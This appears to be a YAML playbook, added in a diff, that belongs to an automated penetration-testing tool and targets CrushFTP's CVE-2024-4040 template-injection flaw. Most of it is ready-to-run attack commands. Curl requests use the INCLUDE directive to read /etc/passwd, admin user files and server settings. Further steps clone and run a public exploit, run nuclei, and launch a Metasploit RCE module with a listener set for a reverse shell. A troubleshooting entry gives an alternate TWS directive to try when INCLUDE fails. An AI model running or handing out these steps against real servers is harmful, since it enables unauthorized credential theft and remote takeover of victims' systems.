@@ -1,0 +1,62 @@
+chain_id: crushftp_cve_2024_4040
+title: "CrushFTP — CVE-2024-4040 unauth VFS sandbox escape → arbitrary file read & RCE"
+severity: CRITICAL
+tags: [web, crushftp, cve-2024-4040, ssti, file-read, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2024-4040" }
+    - { banner_pattern: "(?i)crushftp" }
+    - { product_pattern: "(?i)crushftp" }
+    - { path_pattern: "(?i)/WebInterface/(function|UserManager|login)" }
+
+description: |
+  CrushFTP < 10.7.1 / 11.1.0: the WebInterface template engine
+  evaluates `<INCLUDE>` directives in user-controlled fields without
+  resolving them inside the per-user VFS sandbox. An unauth attacker
+  can read any file on disk (config DBs with admin hashes, SSH keys,
+  customer uploads) and chain to RCE through the same engine. CISA-
+  flagged April 2024, mass-exploited within days.
+
+steps:
+  - id: 1
+    title: "Fingerprint CrushFTP"
+    command: |
+      curl -sk -i "http://$VICTIMA:8080/" | grep -i 'crushftp'
+      curl -sk "http://$VICTIMA:8080/WebInterface/login.html" -I
+
+  - id: 2
+    title: "Read /etc/passwd via the include directive"
+    command: |
+      curl -sk "http://$VICTIMA:8080/WebInterface/function/?command=zip&path=<INCLUDE>/etc/passwd</INCLUDE>"
+
+  - id: 3
+    title: "Pull CrushFTP's own config (admin hashes)"
+    command: |
+      curl -sk "http://$VICTIMA:8080/WebInterface/function/?command=zip&path=<INCLUDE>/opt/crushftp10/users/MainUsers/default/user.XML</INCLUDE>"
+      curl -sk "http://$VICTIMA:8080/WebInterface/function/?command=zip&path=<INCLUDE>/opt/crushftp10/serverSettings.xml</INCLUDE>"
+
+  - id: 4
+    title: "Public PoC + nuclei"
+    command: |
+      git clone https://github.com/airbus-cert/CVE-2024-4040 /tmp/crush
+      python3 /tmp/crush/CVE-2024-4040.py -t http://$VICTIMA:8080 -f /etc/passwd
+      nuclei -u http://$VICTIMA:8080 -t http/cves/2024/CVE-2024-4040.yaml
+
+  - id: 5
+    title: "Or with Metasploit (auth-bypass + RCE module)"
+    command: |
+      msfconsole -qx 'use exploit/multi/http/crushftp_unauth_rce_cve_2024_4040; \
+        set RHOSTS $VICTIMA; set RPORT 8080; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+common_errors:
+  - error: "INCLUDE returns the literal string"
+    solution: |
+      Patched (≥ 10.7.1 / 11.1.0) or admin disabled the legacy
+      template engine. Try the alt `<TWS>...</TWS>` directive on the
+      same endpoint — different parser, same evaluation path.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2024-4040
+  - https://www.crushftp.com/crush11wiki/Wiki.jsp?page=Update
